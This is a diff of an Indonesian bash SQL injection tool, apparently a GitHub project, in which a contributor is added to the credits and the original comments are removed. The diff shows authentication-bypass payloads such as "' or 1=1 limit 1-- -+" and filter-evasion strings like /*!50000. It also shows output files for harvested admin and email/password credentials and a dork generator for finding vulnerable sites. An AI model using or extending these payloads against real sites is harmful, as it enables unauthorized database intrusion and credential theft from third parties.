@@ -1,9 +1,10 @@
 #----- SQL INJECTION -----#
 #----- CODE BY KIMAK -----#
+#---support by Kedjaw3n---#
 #!/usr/bin/env bash
 
 
-xpl="test" #jgn di ubah!!!
+xpl="test"
 xpl1="' or 1=1 limit 1-- -+"
 xpl2="'=''or'"
 xpl3="admin"
@@ -23,30 +24,26 @@ BL='\033[0;96m\033[2m'
 B='\033[1;36m'
 BR="\033[0;34m"
 U="\033[0;35m"
-#di sarankan untuk yg sudah pengalaman sqli manual
-#Hati hati jika mau mengubah query perhatikan variabel nya
-#Semua variabel yg ada sangat sensitiv bisa mengubah total kinerja tools
-#jdi perhatikan besar kecil nya huruf nya yaa.... :)
-#SELAMAT BERKARYA :")
-time_out="30" #time out loading default 30 detik
-corect="y" #auto corect
-#output ressult
-injected_site="injected.txt" #Result history site yg injected dri pertama kali psqli di gunakan
-result_vuln="vuln-sqli.txt" #Result vuln sqli site dari dorking  5 search engine
-admin_site="admin-site.txt" #site yang berisikan admin user pass
-email_site="empass-site.txt" #site yg berisikan email pass
-error_site="error.txt" #site yg tidak bisa di inject
-dork_result="dork.txt" #hasil dari dork generator
-result_admin="login-site.txt" #login page hasil admin finder
-#input
-union_select="union.txt" #berisikan union style yg bisa kamu edit sesukamu
-list_country=".sites" #list berisikan lock country untuk dork generator
-parameter_gen=".key" #list berisikan parameter untuk dork generator
+
+time_out="30" 
+corect="y" 
+
+injected_site="injected.txt" 
+result_vuln="vuln-sqli.txt" 
+admin_site="admin-site.txt" 
+email_site="empass-site.txt" 
+error_site="error.txt" 
+dork_result="dork.txt" 
+result_admin="login-site.txt" 
+
+union_select="union.txt" 
+list_country=".sites" 
+parameter_gen=".key" 
 panel_admin="admin_panel.txt"
-#order by
+
 order_start="1"
-order_by="50" #order total count colom default 50
-#bypasing white space style
+order_by="50" 
+
 w1="/**8**/"
 w2="%23%0a"
 w3="/*!50000"
@@ -2444,7 +2441,7 @@ echo "        ╦ ╔╗╔  ╦ ╔═╗ ╔═╗ ╔╦╗ ╦ ╔═╗ ╔
 echo "        ║ ║║║  ║ ║╣  ║    ║  ║ ║ ║ ║║║"
 echo "        ╩ ╝╚╝ ╚╝ ╚═╝ ╚═╝  ╩  ╩ ╚═╝ ╝╚╝"
 printf "\033[1;31m╔════════════════════════════════════════════╗\n"
-printf "\033[1;31m║\033[1;32m* \033[1;31mAuthor  \033[1;93m: \033[1;37mK1M4K-ID             \033[1;31m           ║\n"
+printf "\033[1;31m║\033[1;32m* \033[1;31mAuthor  \033[1;93m: \033[1;37mK1M4K-ID && Kedjaw3n \033[1;31m           ║\n"
 printf "\033[1;31m║\033[1;32m* \033[1;31mGithub  \033[1;93m: \033[1;37m\033[4mhttps://github.com/K1M4K-ID\033[0m \033[1;31m    ║\n"
 printf "\033[1;31m║\033[1;32m* \033[1;31mBlogs   \033[1;93m: \033[1;37m\033[4mcybersecurity-kimak.blogspot.com\033[0m\033[1;31m║\n"
 printf "\033[1;31m╚════════════════════════════════════════════╝\n\n"
